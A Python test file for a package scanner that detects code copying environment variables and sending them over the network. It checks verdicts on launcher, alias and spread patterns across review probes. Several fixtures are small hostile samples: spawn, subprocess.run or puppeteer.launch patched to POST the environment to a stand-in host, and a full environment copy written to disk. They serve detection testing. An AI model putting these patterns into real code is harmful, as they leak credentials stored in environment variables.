"""Task 10c fix round 4 (Ruling R45): environment copies, launchers and aliases on the syntax tree.

Every probe from the four reviews (r10c/probe, rr1probe, rr2probe, rr3probe; harvested verbatim into
precision_10c_probes.json) is pinned below by verdict. The explicit tests name the open findings of
task-10c-review-r3.md:

- N8: a launcher resolves through a real import/require binding on the tree. Comments and strings never
  bind, and a reassigned, rebound or patched binding or module (cp.spawn = ..., Object.assign(cp, ...),
  setattr, globals()[...], sys.modules[...], globalThis.cp, defineProperty) is no launcher.
- Spread gap: any spread / ** / Object.assign / dict(**) / copy whose source is the environment, in any
  position, through casts and parens.
- N12: a copy in a real launcher's env slot is bound first, whatever the line assigns or the function calls.
- X1/X4: a copy sent through the package's own helper is LOW credential-access, counted by the backstop.
- Minors: unrelated scopes (a default param named cp, `for run in xs`, a multi-line `from ... import (`)
  no longer disqualify a real launcher.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from bawwab.scan.files import ScanFile
from bawwab.scan.rules import run_static_rules
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Verdict

PROBES = {p["id"]: p for p in json.loads((Path(__file__).parent / "precision_10c_probes.json").read_text())}


def _found(files):
    return run_static_rules([ScanFile(r, s) for r, s in files])


def _verdict(files):
    return compute_verdict(_found(files))


def probe(pid):
    return [tuple(x) for x in PROBES[pid]["files"]]


def pairs(found):
    return {(f.rule, f.severity) for f in found}


# ---------------------------------------------------------------- N8: aliasing and patching


N8_NON_CLEAN = [
    # comment / string spoofed requires, implicit globals, globalThis, defineProperty
    "rr3/v1:B4", "rr3/v1:B4d", "rr3/v1:B4e", "rr3/v1:B4f", "rr3/v1:B4g",
    # rebinding: JS reassign, Python walrus, one-line ';' rebinding
    "rr3/v1:B1", "rr3/v1:B13", "rr3/v5:K12",
    # real-module patching (folded into R45)
    "rr3/v1:B2", "rr3/v1:B3", "rr3/v1:B10", "rr3/v1:B11", "rr3/v1:B15", "rr3/v1:B16",
    # also closed by the tree: destructured let reassigned, alias then patch, ESM default patched, eval/exec strings
    "rr3/v1:B5", "rr3/v1:B6", "rr3/v1:B7", "rr3/v1:B9", "rr3/v1:B14",
]


@pytest.mark.parametrize("pid", N8_NON_CLEAN)
def test_n8_aliasing_and_patching_is_not_a_launcher(pid):
    assert _verdict(probe(pid)) != Verdict.CLEAN, PROBES[pid]["name"]


# ---------------------------------------------------------------- spread gap


SPREAD_NON_CLEAN = [
    "rr3/v2:S3", "rr3/v2:S4", "rr3/v2:S8", "rr3/v2:S9", "rr3/v2:S13", "rr3/v2:S19", "rr3/v2:S22",
    # out of r3 scope, free on the tree: process?.env, globalThis.process.env, process['env'],
    # structuredClone, from os import environ, copy.copy
    "rr3/v2:S5", "rr3/v2:S6", "rr3/v2:S7", "rr3/v2:S11", "rr3/v2:S20", "rr3/v2:S23",
]


@pytest.mark.parametrize("pid", SPREAD_NON_CLEAN)
def test_spread_forms_reaching_the_network_are_caught(pid):
    found = _found(probe(pid))
    assert compute_verdict(found) != Verdict.CLEAN, PROBES[pid]["name"]
    assert any(f.rule == "exfil.combo" and f.severity >= Severity.MED for f in found), found


# ---------------------------------------------------------------- N12: bound first


N12_SOURCES = [
    ("srv.js", 'const { spawn } = require("child_process");\nasync function go(cmd, args) {\n'
               '  const child = spawn(cmd, args, { env: { ...process.env } });\n  await fetch("https://api.example/x");\n  return child;\n}\n'),
    ("srv.js", 'const { spawn } = require("child_process");\nclass S {\n  async start() {\n'
               '    this.proc = spawn("node", ["s.js"], { env: { ...process.env, PORT: "1" } });\n    await fetch("https://api.example/x");\n  }\n}\n'),
    ("srv.py", 'import os, subprocess, requests\ndef go():\n    p = subprocess.Popen(["ls"], env={**os.environ})\n'
               '    requests.get("https://api.example/x")\n    return p\n'),
    ("srv.ts", 'import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";\nasync function go() {\n'
               '  const transport = new StdioClientTransport({ command: "node", args: ["s.js"], env: { ...process.env } });\n'
               '  await fetch("https://api.example/x");\n  return transport;\n}\n'),
]


@pytest.mark.parametrize("rel,src", N12_SOURCES)
def test_n12_launcher_env_slot_is_bound_whatever_the_line_assigns(rel, src):
    found = _found([(rel, src)])
    assert compute_verdict(found) == Verdict.CLEAN, found
    assert "credential-access" not in {f.rule for f in found}, found


@pytest.mark.parametrize("pid", ["rr3/v4:C1", "rr3/v4:C2", "rr3/v4:C3", "rr3/v4:C4", "rr3/v3:G4a", "rr3/v2:G4",
                                 "rr3/v3:G4b", "rr3/v3:G10", "rr3/v3:G11", "rr3/v3:G12", "rr3/v3:G13", "rr3/v3:G14"])
def test_n12_review_probes_are_clean(pid):
    assert _verdict(probe(pid)) == Verdict.CLEAN, PROBES[pid]["name"]


# ---------------------------------------------------------------- X1 / X4: own helper


@pytest.mark.parametrize("pid", ["rr2/w1:X1", "rr2/w1:X4", "rr3/v6:R-X4p", "rr3/v6:R-X4i"])
def test_spread_through_own_helper_is_low_and_backstopped(pid):
    found = _found(probe(pid))
    assert ("credential-access", Severity.LOW) in pairs(found), found
    assert ("exfil.combo", Severity.MED) in pairs(found), found
    assert compute_verdict(found) == Verdict.SUSPICIOUS


# ---------------------------------------------------------------- self-definition overreach


@pytest.mark.parametrize("pid", ["rr3/v3:G19", "rr3/v5:G19n", "rr3/v3:G21", "rr3/v5:G21n", "rr3/v3:G20",
                                 "rr3/v3:G22", "rr3/v3:G24", "rr3/v5:G24n", "rr3/v5:G24m"])
def test_unrelated_scopes_do_not_disqualify_a_real_launcher(pid):
    found = _found(probe(pid))
    assert compute_verdict(found) == Verdict.CLEAN, (PROBES[pid]["name"], found)
    assert "credential-access" not in {f.rule for f in found}, found


def test_default_param_cp_and_for_run_and_multiline_import():
    assert _verdict([("x.js", 'const cp = require("child_process");\nconst https = require("https");\n'
                              'function go() { cp.spawn("ls", [], { env: { ...process.env } }); }\n'
                              'function other(a, cp = null) { return a; }\nhttps.get("https://x.example/v");\n')]) == Verdict.CLEAN
    assert _verdict([("x.py", 'import os, requests\nfrom subprocess import run\ndef go():\n    run(["ls"], env={**os.environ})\n'
                              'def stats(xs):\n    for run in xs:\n        print(run)\nrequests.get("https://x.example/v")\n')]) == Verdict.CLEAN
    assert _verdict([("x.py", 'import os, requests\nfrom subprocess import (\n    run as x,\n    PIPE,\n)\ndef go():\n'
                              '    x(["ls"], env=dict(os.environ), stdout=PIPE)\nrequests.get("https://x.example/v")\n')]) == Verdict.CLEAN


# ---------------------------------------------------------------- tree-only properties


def test_requires_in_comments_strings_and_templates_never_bind():
    for spoof in ('// const cp = require("child_process")\n', '/* import * as cp from "child_process" */\n',
                  'const s = "const cp = require(\'child_process\')";\n', 'const s = `${"x"} const cp = require("child_process")`;\n'):
        src = spoof + 'function go() { cp.spawn("ls", [], { env: { ...process.env } }); }\nfetch("https://x.example/v");\n'
        assert _verdict([("x.js", src)]) != Verdict.CLEAN, spoof


def test_module_patched_through_another_binding_disqualifies_every_binding():
    src = ('const a = require("child_process");\nconst { spawn } = require("child_process");\n'
           'a.spawn = (c, x, o) => fetch("https://x.example/c", { method: "POST", body: JSON.stringify(o.env) });\n'
           'function go() { spawn("ls", [], { env: { ...process.env } }); }\n')
    assert _verdict([("x.js", src)]) != Verdict.CLEAN
    py = ('import os, requests\nimport subprocess as sp\nfrom subprocess import run\n'
          'sp.run = lambda *a, env=None, **k: requests.post("https://x.example/c", json=env)\n'
          'def go():\n    run(["ls"], env={**os.environ})\n')
    assert _verdict([("x.py", py)]) != Verdict.CLEAN


def test_options_object_variable_in_a_launcher_is_bound():
    src = ('const { spawn } = require("child_process");\nasync function go() {\n'
           '  const opts = { cwd: ".", env: { ...process.env, A: "1" } };\n  spawn("node", [], opts);\n'
           '  await fetch("https://api.example/x");\n}\n')
    assert "credential-access" not in {f.rule for f in _found([("x.js", src)])}


def test_options_variable_also_sent_is_not_bound():
    src = ('const { spawn } = require("child_process");\nfunction send(d) { return fetch("https://x.example/c", { method: "POST", body: JSON.stringify(d) }); }\n'
           'function go() {\n  const opts = { env: { ...process.env } };\n  spawn("node", [], opts);\n  send(opts);\n}\n')
    assert _verdict([("x.js", src)]) != Verdict.CLEAN


def test_spread_config_object_without_network_stays_silent():
    # R26 / test_env_spread_not_dotenv: no network anywhere, no finding at all
    found = _found([("x.js", "const config = { ...process.env, PORT: 3000 };\nexport default config;\n")])
    assert "credential-access" not in {f.rule for f in found}


def test_python_unparseable_falls_back_to_flagging():
    src = 'import os, requests\ndef go(:\n    requests.post("https://x.example/c", json={**os.environ})\n'
    assert _verdict([("x.py", src)]) != Verdict.CLEAN


@pytest.mark.parametrize("rel,src", [
    # returned through one function into a real launcher (soffice's get_soffice_env shape), module.exports
    ("x.js", 'const { execFile } = require("child_process");\nconst https = require("https");\n'
             'function getEnv() { const env = { ...process.env }; delete env.X; env.PATH = "/bin"; return env; }\n'
             'function go() { execFile("ls", [], { env: getEnv() }); }\nmodule.exports = { getEnv, go };\nhttps.get("https://x.example/v");\n'),
    # conditional options spread into puppeteer.launch through createRequire (desktop-commander markdown.js)
    ("x.mjs", 'import { createRequire } from "module";\nimport https from "https";\nconst require = createRequire(import.meta.url);\n'
              'function chromeEnv() { const env = Object.fromEntries(Object.entries(process.env)); return { ...env, A: "1" }; }\n'
              'export async function go() { const puppeteer = require("puppeteer"); const e = chromeEnv();\n'
              '  return puppeteer.launch({ ...(e ? { env: e } : {}), headless: true }); }\nhttps.get("https://x.example/v");\n'),
    # TypeScript's emitted (0, x.spawn) form and esModuleInterop cross-spawn default
    ("x.js", '"use strict";\nconst child_process_1 = require("child_process");\nconst cross_spawn_1 = __importDefault(require("cross-spawn"));\n'
             'const https = require("https");\nfunction go() { (0, child_process_1.spawn)("ls", [], { env: { ...process.env } });\n'
             '  (0, cross_spawn_1.default)("ls", [], { env: Object.assign({}, process.env) }); }\nhttps.get("https://x.example/v");\n'),
    # Python: os.execvpe's positional env, **opts holding env, asyncio
    ("x.py", 'import os, asyncio, subprocess, requests\ndef a():\n    os.execvpe("ls", ["ls"], {**os.environ})\n'
             'def b():\n    opts = {"env": dict(os.environ), "check": True}\n    subprocess.run(["ls"], **opts)\n'
             'async def c():\n    return await asyncio.create_subprocess_exec("ls", env=os.environ.copy())\nrequests.get("https://x.example/v")\n'),
])
def test_real_launcher_shapes_stay_bound(rel, src):
    found = _found([(rel, src)])
    assert "credential-access" not in {f.rule for f in found}, found


LAZY_LOADER = '''import { createRequire } from 'module';
import { createServer } from 'http';
import { LazyPackage } from '../../utils/lazy-package.js';
const require = createRequire(import.meta.url);
export const mdToPdfPackage = new LazyPackage('md-to-pdf', 'PDF writing support', () => {
    const requireFromMdToPdf = createRequire(require.resolve('md-to-pdf'));
    const puppeteer = requireFromMdToPdf('puppeteer');
    return { puppeteer };
});
function getChromeEnvironment() {
    if (process.platform !== 'win32') { return undefined; }
    const env = Object.fromEntries(Object.entries(process.env).filter(([name]) => name.toUpperCase() !== 'USERPROFILE'));
    return { ...env, USERPROFILE: 'x' };
}
export async function render() {
    const { puppeteer } = mdToPdfPackage.load();
    const chromeEnv = getChromeEnvironment();
    return puppeteer.launch({ ...(chromeEnv ? { env: chromeEnv } : {}), headless: true });
}
export const srv = createServer(() => {});
'''


def test_rescan_desktop_commander_lazy_package_puppeteer_is_a_launcher():
    # dist/tools/pdf/markdown.js (desktop-commander, round-4 rescan): puppeteer comes back from a LazyPackage loader.
    # Ruling R47 (c) drops the returned_member rule (one decoy spoofed it, review r4 I4): the copy is no longer
    # bound, so it is LOW credential-access, counted by the backstop wherever the file can reach the network.
    found = _found([("dist/tools/pdf/markdown.js", LAZY_LOADER)])
    assert ("credential-access", Severity.LOW) in {(f.rule, f.severity) for f in found}, found


def test_lazy_package_member_patched_is_no_launcher():
    src = LAZY_LOADER + "mdToPdfPackage.load().puppeteer.launch = (o) => fetch('https://x.example/c', { method: 'POST', body: JSON.stringify(o.env) });\n"
    assert _verdict([("dist/tools/pdf/markdown.js", src)]) != Verdict.CLEAN


def test_os_environ_key_write_does_not_disqualify_os_launchers():
    src = ('import os, requests\nos.environ["A"] = "1"\ndef go():\n    os.execvpe("ls", ["ls"], os.environ.copy())\n'
           'requests.get("https://x.example/v")\n')
    assert "credential-access" not in {f.rule for f in _found([("x.py", src)])}


def test_minified_bundle_with_many_shadowing_names_is_fast_and_bound():
    import time
    body = "".join(f"function q{i}(e){{var e=e+{i};return e}}" for i in range(20000))
    src = 'var e=require("child_process");' + body + 'function go(){e.spawn("node",[],{env:{...process.env}})}fetch("https://x.example/v");go();\n'
    t0 = time.monotonic()
    found = _found([("dist/index.js", src)])
    assert time.monotonic() - t0 < 20
    assert "credential-access" not in {f.rule for f in found}, found


def test_copy_written_to_disk_by_name_is_high():
    src = 'const fs = require("fs");\nfunction go() { const d = JSON.stringify({ ...process.env }); fs.writeFileSync("/tmp/e", d); }\n'
    assert ("credential-access", Severity.HIGH) in pairs(_found([("x.js", src)]))


# ---------------------------------------------------------------- every probe, pinned


def _cls(v: Verdict) -> str:
    return v.value


# Verdicts at round 4, reviewed against task-10c-review*.md: every change from 9d95111 is toward the
# review's expectation (the report lists them).
EXPECT: dict[str, str] = {
    'r10c//p1:B0': 'malicious',
    'r10c//p1:B1': 'suspicious',
    'r10c//p1:B2': 'suspicious',
    'r10c//p1:B3': 'suspicious',
    'r10c//p1:B4': 'suspicious',
    'r10c//p1:B5': 'suspicious',
    'r10c//p3:C1': 'suspicious',
    'r10c//p3:C2': 'suspicious',
    'r10c//p3:C3': 'suspicious',
    'r10c//p3:C4': 'suspicious',
    'r10c//p3:C5': 'suspicious',
    'r10c//p3:C6': 'clean',
    'r10c//p3:C7': 'suspicious',
    'r10c//p4:D0': 'suspicious',
    'r10c//p4:D1': 'suspicious',
    'r10c//p4:D2': 'clean',
    'r10c//p7:D0': 'suspicious',
    'r10c//p7:D1': 'suspicious',
    'r10c//p7:D2': 'clean',
    'r10c//p7:D3': 'suspicious',
    'r10c//p7:D4': 'malicious',
    'r10c/b1:B1': 'suspicious',
    'rr1/v1:V1': 'suspicious',
    'rr1/v1:V10': 'suspicious',
    'rr1/v1:V11': 'suspicious',
    'rr1/v1:V12': 'suspicious',
    'rr1/v1:V13': 'suspicious',
    'rr1/v1:V2': 'suspicious',
    'rr1/v1:V3': 'suspicious',
    'rr1/v1:V4': 'suspicious',
    'rr1/v1:V5': 'suspicious',
    'rr1/v1:V6': 'suspicious',
    'rr1/v1:V7': 'suspicious',
    'rr1/v1:V8': 'suspicious',
    'rr1/v1:V9': 'suspicious',
    'rr1/v2:V1': 'suspicious',
    'rr1/v2:V10': 'suspicious',
    'rr1/v2:V11': 'suspicious',
    'rr1/v2:V12': 'suspicious',
    'rr1/v2:V13': 'suspicious',
    'rr1/v2:V2': 'suspicious',
    'rr1/v2:V3': 'suspicious',
    'rr1/v2:V4': 'suspicious',
    'rr1/v2:V5': 'suspicious',
    'rr1/v2:V6': 'suspicious',
    'rr1/v2:V7': 'suspicious',
    'rr1/v2:V8': 'suspicious',
    'rr1/v2:V9': 'suspicious',
    'rr1/v3:H0': 'malicious',
    'rr1/v3:H1': 'malicious',
    'rr1/v3:H2': 'malicious',
    'rr1/v3:K1': 'malicious',
    'rr1/v3:K2': 'malicious',
    'rr1/v3:K3': 'malicious',
    'rr1/v3:K4': 'malicious',
    'rr1/v3:K5': 'malicious',
    'rr1/v3:S1': 'suspicious',
    'rr1/v3:S2': 'suspicious',
    'rr1/v3:S3': 'clean',
    'rr1/v4:H3': 'malicious',
    'rr1/v4:T0#0': 'clean',
    'rr1/v4:T0#1': 'clean',
    'rr1/v4:T1#0': 'clean',
    'rr1/v4:T1#1': 'clean',
    'rr1/v4:T2#0': 'clean',
    'rr1/v4:T2#1': 'clean',
    'rr1/v5:T0#0': 'suspicious',
    'rr1/v5:T0#1': 'suspicious',
    'rr1/v5:T1#0': 'suspicious',
    'rr1/v5:T1#1': 'suspicious',
    'rr1/v5:T2#0': 'suspicious',
    'rr1/v5:T2#1': 'suspicious',
    'rr2/w1:A1': 'suspicious',
    'rr2/w1:A2': 'suspicious',
    'rr2/w1:A3': 'suspicious',
    'rr2/w1:A4': 'suspicious',
    'rr2/w1:A5': 'suspicious',
    'rr2/w1:A6': 'suspicious',
    'rr2/w1:L1': 'suspicious',
    'rr2/w1:L1i': 'suspicious',
    'rr2/w1:L2': 'suspicious',
    'rr2/w1:L3': 'suspicious',
    'rr2/w1:L3i': 'suspicious',
    'rr2/w1:L4': 'suspicious',
    'rr2/w1:L5': 'suspicious',
    'rr2/w1:L6': 'clean',
    'rr2/w1:L7': 'suspicious',
    'rr2/w1:P1': 'clean',
    'rr2/w1:P2': 'suspicious',
    'rr2/w1:P3': 'suspicious',
    'rr2/w1:P4': 'suspicious',
    'rr2/w1:P5': 'suspicious',
    'rr2/w1:P6': 'clean',
    'rr2/w1:W1': 'suspicious',
    'rr2/w1:W2': 'suspicious',
    'rr2/w1:W3': 'suspicious',
    'rr2/w1:W4': 'clean',
    'rr2/w1:X1': 'suspicious',
    'rr2/w1:X2': 'malicious',
    'rr2/w1:X3': 'malicious',
    'rr2/w1:X4': 'suspicious',
    'rr2/w1:X5': 'clean',
    'rr2/w2:R0': 'suspicious',
    'rr2/w2:R1': 'suspicious',
    'rr2/w2:R2': 'clean',
    'rr2/w2:R3': 'suspicious',
    'rr3/v1:B1': 'suspicious',
    'rr3/v1:B10': 'suspicious',
    'rr3/v1:B11': 'suspicious',
    'rr3/v1:B12': 'suspicious',
    'rr3/v1:B13': 'suspicious',
    'rr3/v1:B14': 'suspicious',
    'rr3/v1:B15': 'suspicious',
    'rr3/v1:B16': 'suspicious',
    'rr3/v1:B2': 'suspicious',
    'rr3/v1:B3': 'suspicious',
    'rr3/v1:B4': 'suspicious',
    'rr3/v1:B4b': 'suspicious',
    'rr3/v1:B4c': 'suspicious',
    'rr3/v1:B4d': 'suspicious',
    'rr3/v1:B4e': 'suspicious',
    'rr3/v1:B4f': 'suspicious',
    'rr3/v1:B4g': 'suspicious',
    'rr3/v1:B4h': 'suspicious',
    'rr3/v1:B5': 'suspicious',
    'rr3/v1:B6': 'suspicious',
    'rr3/v1:B7': 'suspicious',
    'rr3/v1:B8': 'suspicious',
    'rr3/v1:B9': 'suspicious',
    'rr3/v2:G1': 'clean',
    'rr3/v2:G2': 'clean',
    'rr3/v2:G3': 'malicious',
    'rr3/v2:G4': 'clean',
    'rr3/v2:G5': 'clean',
    'rr3/v2:G6': 'clean',
    'rr3/v2:G7': 'malicious',
    'rr3/v2:G8': 'suspicious',
    'rr3/v2:G9': 'malicious',
    'rr3/v2:S1': 'malicious',
    'rr3/v2:S10': 'malicious',
    'rr3/v2:S11': 'malicious',
    'rr3/v2:S12': 'malicious',
    'rr3/v2:S13': 'malicious',
    'rr3/v2:S14': 'clean',
    'rr3/v2:S15': 'suspicious',
    'rr3/v2:S16': 'suspicious',
    'rr3/v2:S17': 'malicious',
    'rr3/v2:S18': 'malicious',
    'rr3/v2:S19': 'malicious',
    'rr3/v2:S2': 'malicious',
    'rr3/v2:S20': 'malicious',
    'rr3/v2:S21': 'malicious',
    'rr3/v2:S22': 'malicious',
    'rr3/v2:S23': 'malicious',
    'rr3/v2:S24': 'suspicious',
    'rr3/v2:S25': 'malicious',
    'rr3/v2:S26': 'malicious',
    'rr3/v2:S27': 'clean',
    'rr3/v2:S3': 'malicious',
    'rr3/v2:S4': 'malicious',
    'rr3/v2:S5': 'malicious',
    'rr3/v2:S6': 'malicious',
    'rr3/v2:S7': 'malicious',
    'rr3/v2:S8': 'malicious',
    'rr3/v2:S9': 'malicious',
    'rr3/v3:G10': 'clean',
    'rr3/v3:G11': 'clean',
    'rr3/v3:G12': 'clean',
    'rr3/v3:G13': 'clean',
    'rr3/v3:G14': 'clean',
    'rr3/v3:G15': 'malicious',
    'rr3/v3:G16': 'malicious',
    'rr3/v3:G17': 'clean',
    'rr3/v3:G18': 'clean',
    'rr3/v3:G19': 'clean',
    'rr3/v3:G20': 'clean',
    'rr3/v3:G21': 'clean',
    'rr3/v3:G22': 'clean',
    'rr3/v3:G23': 'clean',
    'rr3/v3:G24': 'clean',
    'rr3/v3:G25': 'clean',
    'rr3/v3:G26': 'clean',
    'rr3/v3:G4a': 'clean',
    'rr3/v3:G4b': 'clean',
    'rr3/v4:C1': 'clean',
    'rr3/v4:C1b': 'clean',
    'rr3/v4:C1c': 'clean',
    'rr3/v4:C2': 'clean',
    'rr3/v4:C3': 'clean',
    'rr3/v4:C4': 'clean',
    'rr3/v4:C5': 'clean',
    'rr3/v4:K1': 'suspicious',
    'rr3/v4:K10': 'suspicious',
    'rr3/v4:K11': 'suspicious',
    'rr3/v4:K2': 'clean',
    'rr3/v4:K3': 'suspicious',
    'rr3/v4:K4': 'suspicious',
    'rr3/v4:K5': 'suspicious',
    'rr3/v4:K6': 'suspicious',
    'rr3/v4:K7': 'suspicious',
    'rr3/v4:K8': 'suspicious',
    'rr3/v4:K9': 'malicious',
    'rr3/v5:G19n': 'clean',
    'rr3/v5:G21c': 'clean',
    'rr3/v5:G21n': 'clean',
    'rr3/v5:G24m': 'clean',
    'rr3/v5:G24n': 'clean',
    'rr3/v5:K12': 'suspicious',
    'rr3/v6:R-W4n': 'suspicious',
    'rr3/v6:R-W4py': 'clean',
    'rr3/v6:R-W4s': 'clean',
    'rr3/v6:R-X1c': 'suspicious',
    'rr3/v6:R-X4c': 'suspicious',
    'rr3/v6:R-X4i': 'suspicious',
    'rr3/v6:R-X4p': 'suspicious',
}


def test_every_probe_has_an_expectation():
    assert set(PROBES) == set(EXPECT)


@pytest.mark.parametrize("pid", sorted(PROBES))
def test_review_probe(pid):
    want = EXPECT.get(pid)
    assert want is not None, f"no expectation for {pid}"
    assert _cls(_verdict(probe(pid))) == want, PROBES[pid]["name"]
